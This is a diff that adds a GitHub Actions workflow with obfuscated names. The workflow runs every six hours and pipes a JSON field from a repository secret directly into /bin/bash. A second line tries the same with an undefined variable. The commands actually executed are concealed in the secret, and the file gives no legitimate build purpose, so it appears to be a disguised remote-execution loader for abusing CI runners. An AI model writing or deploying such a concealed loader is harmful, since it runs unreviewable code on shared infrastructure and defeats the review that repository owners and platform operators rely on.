@@ -1,0 +1,19 @@
+name: tousanhougua
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tousanhougua
+        env:
+          d2: ${{ secrets.d2 }}
+        run: |
+          echo $d2 | jq -r .u93 | /bin/bash
+          echo $idrgb369 | jq -r .ybnnv67577 | /bin/bash
+
